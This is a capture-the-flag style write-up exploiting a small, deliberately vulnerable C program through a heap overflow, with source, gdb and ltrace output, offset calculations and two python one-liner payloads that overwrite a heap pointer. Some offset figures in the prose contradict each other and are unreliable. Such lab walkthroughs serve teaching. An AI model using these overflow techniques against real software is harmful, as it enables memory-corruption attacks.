Let's take a look at the source code...

```
#include <stdlib.h>
#include <stdio.h>

struct nova
{
   char pulsar[50];
   int  cluster;
   int *ion;
};

int main()
{
   int solar_wind;

   int ran;
   ran = fopen("/dev/urandom", "rb");
   char rbuf[50];
   fread(rbuf, sizeof(rbuf), 1, ran);
   srand(rbuf);

   struct nova *centari, *castor, *vega;
   
   centari = malloc(sizeof(struct nova));
   centari->ion = malloc(9);
   centari->cluster = 0;

   castor = malloc(sizeof(struct nova));
   castor->ion = malloc(9);
   castor->cluster = 0;
      

   vega = malloc(sizeof(struct nova));
   vega->ion = malloc(9);
   vega->cluster = 0;

   centari->cluster = rand() % 100;
   solar_wind = centari->cluster;
   free(centari);
   free(centari->ion);
   centari->ion = NULL;
   centari = NULL;   

   fgets(castor->ion, 100, stdin);
   
   puts("Where do you want to point the James Webb Space Telescope?");
   if (*vega->ion == solar_wind)
   {
      puts("Wow while managine to not do your research, you discovered life on another planet. I am genuinely surprised. Level Cleared!");
   }
   else
   {
      printf("You see %p.\n", vega->ion);
   }
}
```

So we see that in order to pwn this challenge, we have to set the memory pointed to by vega->ion equal to the value of the int solar_wind. We see that solar_wind is set eqaul to the value of by centari->cluster, which is equal to a random number between 0 and 99. We see that after solar_wind is set equal to centari->cluster, the memory is freed and the pointer is set equal to null thus preventing us from using centari or centari->ion as a stale pointer. 

Just scanning through the program, we see a heap overflow vulnearbillity in which it will allow us to write 100 characters to the space at castor->ion which can only hold 9 characters worth of data. Let's map out the heap space allocated via malloc calls.

```
guyinatuxedo@tux:/Hackery/escape/heap_exp/h4_64$ ltrace ./h4_64 
__libc_start_main(0x400796, 1, 0x7fffffffdf78, 0x400930 <unfinished ...>
fopen("/dev/urandom", "rb")                      = 0x602010
fread(0x7fffffffde30, 50, 1, 0x602010)           = 1
srand(0xffffde30, 50, 0x6020f0, 0x53c1300bf0513346) = 0
malloc(64)                                       = 0x603250
malloc(9)                                        = 0x6032a0
malloc(64)                                       = 0x6032c0
malloc(9)                                        = 0x603310
malloc(64)                                       = 0x603330
malloc(9)                                        = 0x603380
rand(0, 0x603390, 0x603380, 0x7ffff7dd1b20)      = 0x6be340ef
free(0x603250)                                   = <void>
free(0x6032a0)                                   = <void>
fgets(Space is really really vast
"Space is really really vast\n", 100, 0x7ffff7dd18e0) = 0x603310
puts("Where do you want to point the J"...Where do you want to point the James Webb Space Telescope?
)      = 59
printf("You see %p.\n", 0x603380You see 0x603380.
)                = 18
+++ exited (status 0) +++
```

So now we have all of the addresses allocated in the heap.

```
malloc(64)                                       = 0x603250
malloc(9)                                        = 0x6032a0
malloc(64)                                       = 0x6032c0
malloc(9)                                        = 0x603310
malloc(64)                                       = 0x603330
malloc(9)                                        = 0x603380
```

The first thing we notice is that the size of the mallocs of centari, castor, and vega are 64. The program allocates 50 bytes for the pulsar char, and 4 bytes from the cluster int and 8 bytes from the ion pointer. That should make 62 bytes, not 64. However gcc added two bytes worth of padding to the end of pulsar, that way the two pointers after it could be stored in their own word, or 4 bytes segment (because 62 % 4 = 2, however 62 % 4 = 0). Just for demonstration I modified the code to fill in the buffer with 50 characters and set the centari->cluset int to 33 with the following lines of code.

```
   centari->cluster = 33;
   strcpy(centari->pulsar, "00000000000000000000000000000000000000000000000000");
``` 

After the strcpy executed, here was what centari held.

```
gdb-peda$ x/16w 0x603250
0x603250:   0x30303030  0x30303030  0x30303030  0x30303030
0x603260:   0x30303030  0x30303030  0x30303030  0x30303030
0x603270:   0x30303030  0x30303030  0x30303030  0x30303030
0x603280:   0x00003030  0x00000021  0x006032a0  0x00000000
```

So looking for the exploit, we won't be able to touch centari, centari->cluster, or centari->ion. This is because our overflow works towards higher addresses, and our overflow starts at 0x603310 which is higher than any of the those addresses (We know which address stores what, because the same order that the malloc calls happen is the same order that the address appear. Look to h1 and h2 for a better explanation). However this means that the addresses 0x603330 (vega) and 0x603380 (vega->ion) are within our reach. So we control the pointer which is being dereferenced and evaluated. However at this point we have two options. The first involves this. 

```
   free(centari);
   free(centari->ion);
   centari->ion = NULL;
   centari = NULL; 
```

Looking here, it frees the memory and overwrites the pointers with null to prevent stale pointers. However when it frees memory, it doesn't rewrite the memory. It only designates that the memory is able to be used for other purposes. So the data is still there. If we can find the exact address that it is stored at, we can overflow vega->ion to have that address. That way when it is dereferenced and compared against solar_wind, it will have the same value.

```
gdb-peda$ disas main
Dump of assembler code for function main:
   0x0000000000400796 <+0>:   push   rbp
   0x0000000000400797 <+1>:   mov    rbp,rsp
   0x000000000040079a <+4>:   sub    rsp,0x60
   0x000000000040079e <+8>:   mov    esi,0x4009b8
   0x00000000004007a3 <+13>:  mov    edi,0x4009bb
   0x00000000004007a8 <+18>:  call   0x400670 <fopen@plt>
   0x00000000004007ad <+23>:  mov    DWORD PTR [rbp-0x4],eax
   0x00000000004007b0 <+26>:  mov    eax,DWORD PTR [rbp-0x4]
   0x00000000004007b3 <+29>:  cdqe   
   0x00000000004007b5 <+31>:  mov    rdx,rax
   0x00000000004007b8 <+34>:  lea    rax,[rbp-0x60]
   0x00000000004007bc <+38>:  mov    rcx,rdx
   0x00000000004007bf <+41>:  mov    edx,0x1
   0x00000000004007c4 <+46>:  mov    esi,0x32
   0x00000000004007c9 <+51>:  mov    rdi,rax
   0x00000000004007cc <+54>:  call   0x400610 <fread@plt>
   0x00000000004007d1 <+59>:  lea    rax,[rbp-0x60]
   0x00000000004007d5 <+63>:  mov    edi,eax
   0x00000000004007d7 <+65>:  call   0x400640 <srand@plt>
   0x00000000004007dc <+70>:  mov    edi,0x40
   0x00000000004007e1 <+75>:  call   0x400660 <malloc@plt>
   0x00000000004007e6 <+80>:  mov    QWORD PTR [rbp-0x10],rax
   0x00000000004007ea <+84>:  mov    edi,0x9
   0x00000000004007ef <+89>:  call   0x400660 <malloc@plt>
   0x00000000004007f4 <+94>:  mov    rdx,rax
   0x00000000004007f7 <+97>:  mov    rax,QWORD PTR [rbp-0x10]
   0x00000000004007fb <+101>: mov    QWORD PTR [rax+0x38],rdx
   0x00000000004007ff <+105>: mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000400803 <+109>: mov    DWORD PTR [rax+0x34],0x0
   0x000000000040080a <+116>: mov    edi,0x40
   0x000000000040080f <+121>: call   0x400660 <malloc@plt>
   0x0000000000400814 <+126>: mov    QWORD PTR [rbp-0x18],rax
   0x0000000000400818 <+130>: mov    edi,0x9
   0x000000000040081d <+135>: call   0x400660 <malloc@plt>
   0x0000000000400822 <+140>: mov    rdx,rax
   0x0000000000400825 <+143>: mov    rax,QWORD PTR [rbp-0x18]
   0x0000000000400829 <+147>: mov    QWORD PTR [rax+0x38],rdx
   0x000000000040082d <+151>: mov    rax,QWORD PTR [rbp-0x18]
   0x0000000000400831 <+155>: mov    DWORD PTR [rax+0x34],0x0
   0x0000000000400838 <+162>: mov    edi,0x40
   0x000000000040083d <+167>: call   0x400660 <malloc@plt>
   0x0000000000400842 <+172>: mov    QWORD PTR [rbp-0x20],rax
   0x0000000000400846 <+176>: mov    edi,0x9
   0x000000000040084b <+181>: call   0x400660 <malloc@plt>
   0x0000000000400850 <+186>: mov    rdx,rax
   0x0000000000400853 <+189>: mov    rax,QWORD PTR [rbp-0x20]
   0x0000000000400857 <+193>: mov    QWORD PTR [rax+0x38],rdx
   0x000000000040085b <+197>: mov    rax,QWORD PTR [rbp-0x20]
   0x000000000040085f <+201>: mov    DWORD PTR [rax+0x34],0x0
   0x0000000000400866 <+208>: call   0x400680 <rand@plt>
   0x000000000040086b <+213>: mov    ecx,eax
   0x000000000040086d <+215>: mov    edx,0x51eb851f
   0x0000000000400872 <+220>: mov    eax,ecx
   0x0000000000400874 <+222>: imul   edx
   0x0000000000400876 <+224>: sar    edx,0x5
   0x0000000000400879 <+227>: mov    eax,ecx
   0x000000000040087b <+229>: sar    eax,0x1f
   0x000000000040087e <+232>: sub    edx,eax
   0x0000000000400880 <+234>: mov    eax,edx
   0x0000000000400882 <+236>: imul   eax,eax,0x64
   0x0000000000400885 <+239>: sub    ecx,eax
   0x0000000000400887 <+241>: mov    eax,ecx
   0x0000000000400889 <+243>: mov    rdx,QWORD PTR [rbp-0x10]
   0x000000000040088d <+247>: mov    DWORD PTR [rdx+0x34],eax
   0x0000000000400890 <+250>: mov    rax,QWORD PTR [rbp-0x10]
   0x0000000000400894 <+254>: mov    eax,DWORD PTR [rax+0x34]
   0x0000000000400897 <+257>: mov    DWORD PTR [rbp-0x24],eax
   0x000000000040089a <+260>: mov    rax,QWORD PTR [rbp-0x10]
   0x000000000040089e <+264>: mov    rdi,rax
   0x00000000004008a1 <+267>: call   0x4005f0 <free@plt>
   0x00000000004008a6 <+272>: mov    rax,QWORD PTR [rbp-0x10]
   0x00000000004008aa <+276>: mov    rax,QWORD PTR [rax+0x38]
   0x00000000004008ae <+280>: mov    rdi,rax
   0x00000000004008b1 <+283>: call   0x4005f0 <free@plt>
   0x00000000004008b6 <+288>: mov    rax,QWORD PTR [rbp-0x10]
   0x00000000004008ba <+292>: mov    QWORD PTR [rax+0x38],0x0
   0x00000000004008c2 <+300>: mov    QWORD PTR [rbp-0x10],0x0
   0x00000000004008ca <+308>: mov    rdx,QWORD PTR [rip+0x2007af]        # 0x601080 <stdin@@GLIBC_2.2.5>
   0x00000000004008d1 <+315>: mov    rax,QWORD PTR [rbp-0x18]
   0x00000000004008d5 <+319>: mov    rax,QWORD PTR [rax+0x38]
   0x00000000004008d9 <+323>: mov    esi,0x64
   0x00000000004008de <+328>: mov    rdi,rax
   0x00000000004008e1 <+331>: call   0x400650 <fgets@plt>
   0x00000000004008e6 <+336>: mov    edi,0x4009c8
   0x00000000004008eb <+341>: call   0x400600 <puts@plt>
   0x00000000004008f0 <+346>: mov    rax,QWORD PTR [rbp-0x20]
   0x00000000004008f4 <+350>: mov    rax,QWORD PTR [rax+0x38]
   0x00000000004008f8 <+354>: mov    eax,DWORD PTR [rax]
   0x00000000004008fa <+356>: cmp    eax,DWORD PTR [rbp-0x24]
   0x00000000004008fd <+359>: jne    0x40090b <main+373>
   0x00000000004008ff <+361>: mov    edi,0x400a08
   0x0000000000400904 <+366>: call   0x400600 <puts@plt>
   0x0000000000400909 <+371>: jmp    0x400925 <main+399>
   0x000000000040090b <+373>: mov    rax,QWORD PTR [rbp-0x20]
   0x000000000040090f <+377>: mov    rax,QWORD PTR [rax+0x38]
   0x0000000000400913 <+381>: mov    rsi,rax
   0x0000000000400916 <+384>: mov    edi,0x400a84
   0x000000000040091b <+389>: mov    eax,0x0
   0x0000000000400920 <+394>: call   0x400620 <printf@plt>
   0x0000000000400925 <+399>: mov    eax,0x0
   0x000000000040092a <+404>: leave  
   0x000000000040092b <+405>: ret    
End of assembler dump.
gdb-peda$ b *main+356
Breakpoint 1 at 0x4008fa
gdb-peda$ r
Starting program: /Hackery/escape/heap_exp/h4_64/h4_64 
75395128
Where do you want to point the James Webb Space Telescope?
```

One wall of text later...

```
Breakpoint 1, 0x00000000004008fa in main ()
gdb-peda$ x/16w 0x603250
0x603250:   0xf7dd1bd8  0x00007fff  0xf7dd1bd8  0x00007fff
0x603260:   0x00000000  0x00000000  0x00000000  0x00000000
0x603270:   0x00000000  0x00000000  0x00000000  0x00000000
0x603280:   0x00000000  0x00000043  0x00000000  0x00000000
gdb-peda$ x/d 0x603284
0x603284:   67
```

So we have the address that the value is stored at, 0x603284. Now we need to figure out the offset needed to reach vega->ion. We know that our input starts at 0x603310, and it should be 56 bytes after 0x603330 (because 8 byte pointer is the last thing in the struct, so it should be 8 bytes away from the end). 

```
0x603330 + 56 = 0x603368
0x603368 - 0x603310 = 88
```

So if our math is correct, the offset needed to reach vega->ion is 56 characters. The program prints out vega->ion as a pointer if we mess up so we can see what happened, so let's try to just give it 92 characters followed by the 0x603284 address.

```
guyinatuxedo@tux:/Hackery/escape/heap_exp/h4_64$ python -c 'print "0"*88 + "\x84\x32\x60\x00\x00\x00\x00\x00"' | ./h4_64 
Where do you want to point the James Webb Space Telescope?
Wow while managine to not do your research, you discovered life on another planet. I am genuinely surprised. Level Cleared!
```

Just like that, we pwned the binary using a use after free exploit. However there is another way we could pwn it. There are two places in the program's memory that stores the value we need, and we already pointed to one of them. We could overflow the pointer to point to the int solar_wind itself, that way when the if then statment runs it will be effictively checking if solar_wind is equal to solar_wind. First we will need to find the relative address of sloar_wind on the stack. Let's try looking at the assembly code for the if then statement.

```
   0x00000000004008f0 <+346>: mov    rax,QWORD PTR [rbp-0x20]
   0x00000000004008f4 <+350>: mov    rax,QWORD PTR [rax+0x38]
   0x00000000004008f8 <+354>: mov    eax,DWORD PTR [rax]
=> 0x00000000004008fa <+356>: cmp    eax,DWORD PTR [rbp-0x24]
```

So looking at this assembly, the eax register is being compared against the value at rbp-0x24. The value being moved into the eax register looks like a drereferenced pointer, so let's set a breakpoint for main+356 and see what ebp-0x1c holds.

```
db-peda$ b *main+356
Breakpoint 1 at 0x4008fa
gdb-peda$ r
Starting program: /Hackery/escape/heap_exp/h4_64/h4_64 
75395128
Where do you want to point the James Webb Space Telescope?
```

One wall of text later...

```
Breakpoint 1, 0x00000000004008fa in main ()
gdb-peda$ x/w $rbp-0x24
0x7fffffffde2c:   0x00000043
gdb-peda$ x/d $rbp-0x24
0x7fffffffde2c:   67
```

So that decimal there matches what we would expect, so it probably is the value were looking for. It is stored at the address 0x7fffffffde2c in gdb. However since stack addresses change, when we run it outside of gdb we will have a different address however it will be close to it. Let's try pushing addresses close to 0x7fffffffde2c to vega->ion and see if we find the right address.

```
Addresses I tried:
0x7fffffffde2c
0x7fffffffde3c
0x7fffffffde4c
0x7fffffffde5c
0x7fffffffde6c
```

Then I found the correct address, 0x7fffffffde6c. So the final alternative exploit looks like this (the zeroes are needed to fill up space to allow for proper formatting).

```
guyinatuxedo@tux:/Hackery/escape/heap_exp/h4_64$ python -c 'print "0"*88 + "\x6c\xde\xff\xff\xff\x7f\x00\x00"' | ./h4_64 
Where do you want to point the James Webb Space Telescope?
Wow while managine to not do your research, you discovered life on another planet. I am genuinely surprised. Level Cleared!
```

Just like that we pwned the binary again. 
